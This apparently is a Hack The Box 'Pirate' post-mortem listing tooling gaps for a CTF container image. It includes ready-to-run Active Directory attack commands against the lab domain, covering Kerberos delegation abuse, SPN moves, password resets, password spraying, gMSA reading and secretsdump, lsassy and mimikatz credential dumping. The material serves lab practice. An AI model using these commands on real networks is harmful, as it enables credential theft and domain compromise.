# Tooling Gaps — Pirate (HTB) fullpwn post-mortem
**For the container image maintainer. Add these so the next box goes faster.**
Context: Linux container, user `ctf` (uid 1000, **no sudo**), Python 3.12.3.
Companion file: `../TOOLING_ISSUES.md` (earlier-session gaps, still valid) and
`TOOLING_ISSUES.md` in the box archive. This list is ranked by time actually lost
during the DA-pursuit phase (SPN manipulation / delegation / Kerberos / secrets).

---

## 1. CRITICAL — `sudo` (unblocks everything below)
Everything that hurt traces back to not being able to install/modify system state.

```bash
apt-get install -y sudo && usermod -aG sudo ctf
# then: apt-get install faketime; sudo chown -R ctf /usr/local/lib/python3.12/dist-packages/impacket
```

## 2. CRITICAL — binary `faketime` (libfaketime), NOT a Python shim
The DC was **+7h ahead** of the container. Every Kerberos op (getTGT/getST/secretsdump
`-k`, atexec `-k`) failed with clock-skew until we shimmed time. Our
`loot/faketime/sitecustomize.py` only affects Python processes that call `time.time()`
and is **silently swallowed** on interpreter start in this Python build (must be
imported explicitly). A binary faketime works for *every* tool (curl, evil-winrm, nmap):

```bash
apt-get install -y faketime            # provides /usr/bin/faketime + libfaketime.so
faketime '+7 hours' python3 getST.py -hashes :... 'pirate.htb/user' ...
KRB5CCNAME=... faketime '+7 hours' secretsdump.py -k -no-pass 'pirate.htb/Administrator@dc01.pirate.htb'
```
Also ship a **KDC-time check** one-liner so the offset is never a mystery:
```bash
# parse Kerberos KRB-ERROR clock skew from the AS-REQ (nmap or python):
nmap -sU -p88 --script krb5-enum-users <kdc>      # prints KDC date
```
If we'd had `sudo`, `date -s '+7 hours'` would have fixed the whole box in one command.

## 3. HIGH — impacket WITH PKINIT (`impacket.krb5.pkinit`)
The installed impacket `0.14.0.dev0` snapshot lacks `krb5/pkinit.py`, so `getTGT.py -pfx`
does not exist. We held an ESC17 `administrator.pfx` (Server-Auth EKU → PKINIT-rejected
by the KDC) but could not even test the path; with a client-auth cert (ESC1/ESC3/ESC17)
this is normally a **one-command DA**:
```bash
pip install --upgrade impacket
python3 -c "import impacket.krb5.pkinit; print('pkinit OK')"
getTGT.py -pfx user.pfx -dc-ip <kdc> 'domain/user'
```

## 4. HIGH — `bloodyAD` (AD abuse one-liners)
The entire final phase (SPN move, constrained-delegation config, UAC toggles, password
reset) was hand-rolled `ldap3` scripts (`spn_move*.py`, `set_delegation_*.py`,
`reset_ms01.py`). `bloodyAD` covers all of it:
```bash
pip install bloodyAD
bloodyAD --host 10.129.244.95 -d pirate.htb -u a.white_adm -p '<pw>' \
  add spn 'DC01$' 'HTTP/WEB01.pirate.htb'
bloodyAD --host ... remove spn 'WEB01$' 'HTTP/WEB01.pirate.htb'
bloodyAD --host ... set delegation a.white_adm --to 'cifs/DC01.pirate.htb'
bloodyAD --host ... set uac pwn01$ +TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD --host ... set password a.white_adm 'NewPw!'
bloodyAD --host ... add computer pwn01 -p 'Passw0rd!'
```

## 5. HIGH — `gMSADumper`
Roadmap step 4 literally is "deployed gMSADumper". We reimplemented it as
`gmsa_read.py` (Kerberos SASL LDAP + nxc `MSDS_MANAGEDPASSWORD_BLOB`). Just install it:
```bash
git clone https://github.com/micahvandeusen/gMSADumper
python3 gMSADumper.py -u MS01$ -p '' -d pirate.htb -l 10.129.244.95
```

## 6. HIGH — `mimikatz.exe` + `lsassy` (remote LSA secrets)
Getting secrets off WEB01 meant `reg save` of `SAM/SYSTEM/SECURITY` hives over SMB,
copying them home, then `secretsdump` offline. `lsassy` does it remotely in one shot
(and catches cached creds + DPAPI keys); mimikatz is the on-box fallback:
```bash
pip install lsassy
lsassy -d pirate.htb -u user -p pw 192.168.100.2
```
If you land SYSTEM, `mimikatz.exe "sekurlsa::logonpasswords"` beats hive-copying.
(Note: `reg save` + `secretsdump -sam -system -security` is a perfectly good
no-binary path — keep the doc for it.)

## 7. MEDIUM — `Rubeus.exe` (Windows Kerberos swiss-army)
Complement to impacket when you hold code exec on a Windows host: `s4u`, `asktgt`,
`tgtdeleg`, ticket export. Would have made the S4U2Self/S4U2Proxy round on WEB01 and
the final delegation round on DC01 exercisable locally.
```bash
# pre-stage: /opt/tools/win/Rubeus.exe
Rubeus.exe s4u /user:pwn01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/WEB01.pirate.htb /ptt
```

## 8. MEDIUM — `kerbrute`
We enumerated users/sprayed via LDAP (worked, because creds). For pre-auth phases
(user enum, password spray, ASREP roast) kerbrute is the fast tool:
```bash
# download ropnop/kerbrute binary (linux + windows) into /opt/tools/bin
kerbrute userenum -d pirate.htb users.txt --dc 10.129.244.95
kerbrute passwordspray -d pirate.htb spray.txt --dc 10.129.244.95
```

## 9. MEDIUM — cached-cred (DCC2/mscash2) format helper
We extracted `$DCC2$10240#user#hex` cached hashes from the SECURITY hive and
hand-derived the DCC2 algorithm (PBKDF2-HMAC-SHA1 10240 iters over
`MD4(NT||LowerUnicode(user))`). Faster paths:
```bash
# secretsdump on the hives already prints cached creds; just reformat:
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
# hashcat mode for mscash2:  -m 2100
# john:  mscash2john
```
Consider shipping a tiny `dcc2reformat.py` that turns `secretsdump` cached output into
hashcat `$DCC2$10240#user#hex` lines.

## 10. MEDIUM — pre-staged Windows binaries
`chisel_windows.zip` downloaded fine, but the `.gz` variant was **9 bytes** (broken
download) and needed a retry. Stage these in `/opt/tools/win/` at build time so
mid-engagement fetch flakiness can't stall the chain:
`chisel.exe`, `mimikatz.exe`, `procdump64.exe`, `Rubeus.exe`, `SharpHound.exe`,
`PowerView.ps1`, `JuicyPotato`/`PrintSpoofer` style LPE tools (rarely needed, cheap).

## 11. LOW — misc niceties
- `dacledit` (`pip install dacledit` — ThePorgs) — read/modify DACLs. We used
  `netexec -M daclread` (works; `-tgt` flag is broken, use `-o TARGET_DN=...`).
- `pywhisker` — shadow-credentials as an RBCD alternative (genericAll on a target).
- `windapsearch`, `ldapdomaindump`, `bloodhound-python`, `evil-winrm`, `certipy 5.1.0`,
  `hashcat`, `john`, `netexec`, `chisel`, `proxychains4` — **already present, verified
  working, keep them.**

## 12. Notes / gotchas that cost time (keep in docs)
- `evil-winrm -k` **hangs unless a TGT ccache is present AND `-p ''` is passed**.
  Prefer impacket `*exec.py -k -no-pass` for service-ticket auth (they consume a TGS
  directly, no TGT needed).
- `getST.py -altservice cifs/HOST` is available in the installed impacket — it rewrites
  the ticket sname without re-requesting. This is the trick that turned an
  `HTTP/WEB01.pirate.htb` SPN bound to the DC into `cifs/DC01` access.
- `ntlmrelayx.py --remove-mic` (Drop-the-MIC / CVE-2019-1040) + `netexec -M coerce_plus`
  both work out of the box — do not reinstall.
- sitecustomize auto-import is swallowed; if you must shim, use the runpy wrapper
  pattern (`import patch; runpy.run_path(tool, run_name='__main__')`).
- To see *why* a relay/LDAP bind fails, `netexec -M daclread`/ldap3 error output is
  swallowed; the `loot/relay/patch_ldap_log.py` monkeypatch pattern is the workaround.
- `pkill -f "tail -f /dev/null"` kills the calling shell — kill relays by PID from
  `ss -tlnp | grep :445`.
